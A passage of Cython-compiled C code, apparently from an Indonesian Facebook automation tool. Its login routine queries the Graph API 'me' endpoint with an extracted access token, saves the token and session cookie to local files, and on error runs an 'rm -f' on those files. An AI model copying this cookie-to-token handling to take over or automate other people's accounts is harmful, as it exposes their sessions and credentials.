      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_find_token, __pyx_n_s_group); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 156, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_9 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_10, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_int_1);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 156, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = PyNumber_Add(__pyx_kp_u_https_graph_facebook_com_me_acce_2, __pyx_t_9); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 156, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_5 = (__pyx_t_9) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_9, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_7);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 156, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_json); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 156, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 156, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_6, __pyx_n_u_name); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 156, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_nama = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__15, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 157, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_write); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 157, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_find_token, __pyx_n_s_group); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 157, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_6 = (__pyx_t_9) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_9, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_int_1);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 157, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_7, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 157, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__19, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 158, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_write); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 158, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_5, __pyx_v_cookie) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_v_cookie);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 158, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_prints); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 159, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_Panel); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 159, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_find_token, __pyx_n_s_group); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 159, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_11 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_11)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_11);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_9 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_11, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_int_1);
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 159, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 159, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_N); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 159, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 159, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = __Pyx_PyUnicode_Concat(__pyx_t_10, __pyx_t_11); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 159, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __pyx_t_11 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_11)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_11);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_5 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_11, __pyx_t_9) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_9);
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 159, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_7, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 159, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_prints); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 160, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_Panel); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 160, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_9 = PyTuple_New(3); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 160, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_12 = 0;
      __pyx_t_13 = 127;
      __Pyx_INCREF(__pyx_kp_u_bold_white_Selamat_Datang_bold);
      __pyx_t_12 += 40;
      __Pyx_GIVEREF(__pyx_kp_u_bold_white_Selamat_Datang_bold);
      PyTuple_SET_ITEM(__pyx_t_9, 0, __pyx_kp_u_bold_white_Selamat_Datang_bold);
      __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_v_nama, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 160, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_13 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_13) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_13;
      __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
      __Pyx_GIVEREF(__pyx_t_11);
      PyTuple_SET_ITEM(__pyx_t_9, 1, __pyx_t_11);
      __pyx_t_11 = 0;
      __Pyx_INCREF(__pyx_kp_u_bold_white_User_Premium);
      __pyx_t_12 += 25;
      __Pyx_GIVEREF(__pyx_kp_u_bold_white_User_Premium);
      PyTuple_SET_ITEM(__pyx_t_9, 2, __pyx_kp_u_bold_white_User_Premium);
      __pyx_t_11 = __Pyx_PyUnicode_Join(__pyx_t_9, 3, __pyx_t_12, __pyx_t_13); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 160, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_5 = (__pyx_t_9) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_9, __pyx_t_11) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_11);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 160, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_7, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 160, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_time); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 161, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_sleep); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 161, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_6, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_int_1);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 161, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_Menu); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 162, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_menu); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 162, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 162, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 162, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    
    __pyx_t_8 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_8) {
      __Pyx_AddTraceback("login.get_cookie", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_4, &__pyx_t_5) < 0) __PYX_ERR(0, 163, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_4);
      __pyx_v_e = __pyx_t_4;
       {

        
        __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_os); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 164, __pyx_L14_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 164, __pyx_L14_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_11)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
          }
        }
        __pyx_t_7 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_9, __pyx_t_11, __pyx_kp_u_rm_f_data_token_txt_data_cookie) : __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_kp_u_rm_f_data_token_txt_data_cookie);
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 164, __pyx_L14_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

        
        __pyx_t_7 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__17, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 165, __pyx_L14_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_prints); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 166, __pyx_L14_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_Panel); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 166, __pyx_L14_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_14 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
          __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_10);
          if (likely(__pyx_t_14)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
            __Pyx_INCREF(__pyx_t_14);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_10, function);
          }
        }
        __pyx_t_11 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_14, __pyx_kp_u_bold_red_Cookie_invalid_atau_ti) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_kp_u_bold_red_Cookie_invalid_atau_ti);
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 166, __pyx_L14_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
          }
        }
        __pyx_t_7 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_9, __pyx_t_10, __pyx_t_11) : __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_11);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 166, __pyx_L14_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_sys); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 167, __pyx_L14_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_exit); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 167, __pyx_L14_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
          __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_11);
          if (likely(__pyx_t_9)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
            __Pyx_INCREF(__pyx_t_9);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_11, function);
          }
        }
        __pyx_t_7 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_11);
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 167, __pyx_L14_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      }

      
       {
        {
          __Pyx_DECREF(__pyx_v_e);
          __pyx_v_e = NULL;
          goto __pyx_L15;
        }
        __pyx_L14_error:;
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __pyx_t_17 = 0; __pyx_t_18 = 0; __pyx_t_19 = 0; __pyx_t_20 = 0; __pyx_t_21 = 0; __pyx_t_22 = 0;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_20, &__pyx_t_21, &__pyx_t_22);
          if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_17, &__pyx_t_18, &__pyx_t_19) < 0)) __Pyx_ErrFetch(&__pyx_t_17, &__pyx_t_18, &__pyx_t_19);
          __Pyx_XGOTREF(__pyx_t_17);
          __Pyx_XGOTREF(__pyx_t_18);
          __Pyx_XGOTREF(__pyx_t_19);
          __Pyx_XGOTREF(__pyx_t_20);
          __Pyx_XGOTREF(__pyx_t_21);
          __Pyx_XGOTREF(__pyx_t_22);
          __pyx_t_8 = __pyx_lineno; __pyx_t_15 = __pyx_clineno; __pyx_t_16 = __pyx_filename;
          {
            __Pyx_DECREF(__pyx_v_e);
            __pyx_v_e = NULL;
          }
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_20);
            __Pyx_XGIVEREF(__pyx_t_21);
            __Pyx_XGIVEREF(__pyx_t_22);
            __Pyx_ExceptionReset(__pyx_t_20, __pyx_t_21, __pyx_t_22);
          }
          __Pyx_XGIVEREF(__pyx_t_17);
          __Pyx_XGIVEREF(__pyx_t_18);
